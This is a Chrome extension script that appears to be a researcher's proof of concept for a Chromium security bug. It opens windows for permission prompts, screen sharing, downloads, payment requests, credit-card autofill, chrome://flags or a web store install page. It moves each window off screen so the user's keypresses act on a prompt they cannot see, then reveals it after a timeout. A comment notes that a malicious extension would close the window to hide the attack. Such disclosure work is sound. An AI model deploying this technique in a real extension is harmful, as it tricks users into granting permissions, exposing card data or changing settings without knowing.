
/***** INSTRUCTIONS ******
Set scenario below, then (re)load extension to run.
****** INSTRUCTIONS *****/

var scenario = 'permission';
//var scenario = 'screenshare';
//var scenario = 'download';
//var scenario = 'payment';
//var scenario = 'autofill';
//var scenario = 'autofill-creditcard';
//var scenario = 'externalprotocol';
//var scenario = 'flags';
//var scenario = 'extension';

// Some scenarios need additional logic after creating the window
var createCallback = () => {};

// Scenarios have varying attack times (mainly based on number of keypresses)
var revealTimeout = 5000;

chrome.runtime.onInstalled.addListener(() => {  
  console.info('Extension running.');

  // Create tab in existing window with instructions for user
  chrome.tabs.create({
    url: 'https://alesandroortiz.com/security/chromium/offscreen-instructions.html?'+scenario
  }, (tab) => {

    var hiddenUrl = 'https://alesandroortiz.com/security/chromium/offscreen.html?'+scenario;
    switch (scenario) {
      case 'extension':
        hiddenUrl = 'https://chrome.google.com/webstore/detail/google-translate/aapbdbdomjkkjkaonfhkkikfgjllcleb';
        revealTimeout = 12000;
        break;
      case 'flags':
        hiddenUrl = 'chrome://flags/';
        // For keyboard interaction to start from specific flag, we need to wait for content to render
        createCallback = () => {
          setTimeout(async () => {
            var tab = await chrome.tabs.query({active: true, currentWindow: true});
            chrome.tabs.update(tab.id, {url: 'chrome://flags/#enable-reader-mode'});
          }, 800);
        }
        revealTimeout = 4000;
        break;
      case 'payment':
        revealTimeout = 6000;
        break;
      case 'autofill':
      case 'autofill-creditcard':
        revealTimeout = 4000;
        break;
    }

    // Create visible window which we will immediately hide
    chrome.windows.create({
      url: hiddenUrl,
      width: 400,
      height: 400
    }, (win) => {
      // Immediately hide window by moving it off screen
      
      // For screen share dialog, external protocol dialog, any page interaction
      // chrome.windows.update(win.id, {left: 15000, top: 15000});
      // chrome.windows.update(win.id, {left: -3000, top: -3000}); 
      
      // For permission prompt (camera, etc.), autofill, pointer lock, payment request, downloads bar interaction with window size {width: 400, height: 400}. Different sizes may work with different coordinates.
      // This also works for the other areas (dialogs, page interaction).
      chrome.windows.update(win.id, {left: -500, top: -400});
      
      // Some scenarios need additional logic after creating the window
      createCallback();

      setTimeout(async () => {
        // Reveal created window to demonstrate attack.
        // A malicious extension would close the window after attack to prevent discoverability.
        chrome.windows.update(win.id, {left:100, top:100});
      }, revealTimeout);
    });
    
  });
  
});
